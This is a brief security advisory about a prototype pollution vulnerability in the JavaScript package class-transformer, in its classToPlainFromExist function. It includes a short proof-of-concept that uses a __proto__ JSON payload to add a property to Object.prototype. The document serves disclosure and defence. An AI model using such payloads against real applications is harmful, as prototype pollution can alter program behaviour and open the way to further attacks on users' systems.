# Overview
`class-transformer` is a Proper decorator-based transformation/serialization/deserialization of plain javascript objects to class constructors.

This package are vulnerable to Prototype Pollution, the `classToPlainFromExist` function can be tricked into adding or modifying properties of `Object.prototype` using a __proto__ payload.

# Proof of Concept
```
var root = require("class-transformer");
var payload = JSON.parse('{"__proto__": {"hjw": "jhu"}}');
root.classToPlainFromExist(payload,{});
console.log({}.hjw);
```